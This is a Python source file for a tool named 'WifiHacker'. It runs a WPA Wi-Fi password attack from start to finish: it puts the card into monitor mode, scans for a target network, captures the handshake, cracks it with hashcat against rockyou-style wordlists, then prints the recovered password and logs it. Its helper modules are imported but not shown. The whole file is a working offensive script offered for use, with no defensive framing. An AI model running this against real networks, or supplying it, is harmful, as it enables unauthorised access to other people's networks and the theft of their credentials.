#!/usr/bin/env python3
import os
import sys
import logging
import subprocess
from modules.credential_logger import CredentialLogger
from modules.handshake_capturer import CaptureHandshake
from modules.wpa_cracker import WPACracker
from modules.wifi_interface import WifiInterface
from modules.wifi_scanner import WifiScanner


class WifiHacker:
    common_wordlist = [
        "/usr/share/wordlists/rockyou.txt",
        "/usr/share/wordlists/rockyou.txt.gz",
        "/usr/share/dict/wordlist-probable.txt",
        "/opt/wordlists/rockyou.txt",
        "/usr/share/john/password.lst",
        "/pentest/passwords/wordlists/rockyou.txt"
    ]
    
    def __init__(self, interface='wlan0', wordlist=None, debug=False, ssid=None, bssid=None):
        self.interface = interface
        self.debug = debug
        self.wordlist = self.validate_wordlist(wordlist)  
        self.ssid = ssid      
        self.bssid = bssid    
        self.validate_root()  
        self.check_required_tools()  
        self.initialize_components()  
        self.logger = logging.getLogger("WifiHacker")

    def validate_wordlist(self, wordlist_path):
        if wordlist_path:
            if os.path.exists(wordlist_path):
                return os.path.abspath(wordlist_path)
            sys.stderr.write(f"Warning: Specified wordlist not found: {wordlist_path}\n")
        
        # Try common locations
        for wordlist in self.common_wordlist:
            if os.path.exists(wordlist):
                sys.stdout.write(f"Using default wordlist: {wordlist}\n")
                return wordlist
        
        sys.stderr.write("Error: No suitable wordlist found\n")
        sys.stderr.write("Please specify one with -w or install a default wordlist\n")
        sys.exit(1)

    def validate_root(self):
        
        if os.geteuid() != 0:
            sys.stderr.write("This script must be run as root!\n")
            sys.exit(1)

    def check_required_tools(self): 
        required_tools = ['airodump-ng', 'hcxpcapngtool', 'hashcat', 'iwconfig']
        missing = []

        for tool in required_tools:
            try:
                subprocess.run(['which', tool], 
                            check=True, 
                            stdout=subprocess.PIPE, 
                            stderr=subprocess.PIPE)
            except subprocess.CalledProcessError:
                missing.append(tool)

        if missing:
            sys.stderr.write(f"Error: Missing required tools: {', '.join(missing)}\n")
            sys.exit(1)

    def initialize_components(self): 
            self.wifi_interface = WifiInterface(self.interface, self.debug)
            self.wifi_scanner = WifiScanner(self.interface, self.debug)
            self.handshake_capturer = CaptureHandshake(self.interface, self.debug)
            self.wpa_cracker = WPACracker(self.interface, self.debug, self.wordlist)
            self.credential_logger = CredentialLogger()

    def execute(self):
        """Main execution flow using all component classes"""
        try:
            # 1. Set to monitor mode (using WifiInterface)
            self.wifi_interface.enable_monitor_mode()
            
            # 2. Scan for networks (using WifiScanner)
            target = self.wifi_scanner.scan_networks(target_ssid=self.ssid, target_bssid=self.bssid  )
            
            if not target:
                return self._clean_up("No networks found", error=True)
            
            # 3. Capture handshake (using CaptureHandshake)
            pcap = self.handshake_capturer.capture_handshake(
                target['bssid'], 
                target['channel']
            )
            if not pcap:
                return self._clean_up("Handshake capture failed", error=True)
            
            # 4. Crack password (using WPACracker)
            if not self._attempt_crack(pcap, target):
                return self._clean_up("Password crack failed", error=True)
                
        except KeyboardInterrupt:
            self._clean_up("\nOperation cancelled by user")
        except Exception as e:
            self._clean_up(f"Error: {str(e)}", error=True)
        finally:
            self._final_clean_up()

    def _attempt_crack(self, pcap, target):
        """Handle the cracking process using WPACracker"""
        # Use WPACracker's methods directly
        hash_file = self.wpa_cracker.convert_capture_to_hashcat(pcap)
        if not hash_file:
            return False
            
        if not self.wpa_cracker.crack_hash(hash_file):
            return False
            
        password = self.wpa_cracker.extract_password()
        if password:
            self._log_results(target, password)
            return True
        return False

    def _log_results(self, target, password):
        """Use CredentialLogger to save results"""
        sys.stdout.write(f"Success! Password: {password}\n")
        self.credential_logger.save_credentials(
            target['ssid'],
            target['bssid'], 
            password
        )

    def _clean_up(self, message, error=False):
        """Handle cleanup with proper messaging"""
        if error:
            sys.stderr.write(f"Error: {message}\n")
        else:
            sys.stdout.write(f"{message}\n")
        self._final_clean_up()

    def _final_clean_up(self):
        """Reset interface and clean files using component methods"""
        self.wifi_interface.reset_mode()
        self.wifi_scanner.clean_up_files([
            "scan-01.*",
            "capture_*",
            "*.cap", 
            "*.hc22000",
            "cracked_results_*.txt"
        ])
        sys.stdout.write("Cleanup complete\n")
